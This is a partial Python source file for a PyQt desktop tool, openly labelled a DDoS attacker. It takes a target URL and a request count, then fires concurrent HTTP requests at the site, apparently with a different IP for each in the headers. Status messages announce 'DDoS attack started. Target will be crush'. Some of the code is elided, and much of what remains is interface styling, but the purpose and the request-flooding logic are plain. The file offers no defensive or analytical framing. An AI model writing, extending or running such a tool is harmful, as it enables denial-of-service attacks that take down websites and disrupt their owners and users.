    ...
    async def send_request(self, session, ip_address):
        ...
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                self.log_signal.emit(f"xd@root -> {self.target_url} with IP: {ip_address} - Status: {response.status}")
        except Exception:
            pass  
...
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("xxxxxxxxxxxxxxxx")
        self.setGeometry(200, 200, 600, 600)
        self.setStyleSheet("QMainWindow { background-color: #511058; color: white; border-radius: 5px; }")
        ...
        self.log_output.setStyleSheet("background-color: #511058; color: #FF0000; border: 1px solid #d500ff; border-radius: 5px;")
        layout.addWidget(self.log_output)

        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: #511058;")
        layout.addWidget(self.image_label)

        image_url = "https://i.pinimg.com/736x/ad/bc/c9/adbcc937f3a69d49020b7b33fd6f3054.jpg"
        self.load_image(image_url)

        slogan_label = QLabel("")
        slogan_label.setAlignment(Qt.AlignCenter)
        slogan_label.setStyleSheet("color: #ffffff; font-size: 14px; font-weight: bold;")
        ...
        self.url_input.setStyleSheet("background-color: #fffff; color: white; border: 1px solid #FF0000; border-radius: 5px;")
        ...
        self.requests_input.setStyleSheet("background-color: #fffff; color: white; border: 1px solid #511058; border-radius: 5px;")
        layout.addWidget(self.requests_input, alignment=Qt.AlignCenter)

        self.start_button = QPushButton("Start")
        self.start_button.setFixedWidth(100)
        self.start_button.setStyleSheet("background-color: #f570e5; color: white; border-radius: 5px;")
    ...
    def start_attack(self):
        ...
        try:
            ...
            QMessageBox.critical(self, "xd", "Number of requests must be an integer!")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "xd", "Enter a valid URL and number of requests!")
            return

        self.log_message("DDoS attack started. Target will be crush")

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "xd", "Attack has begun! Check the logs!")
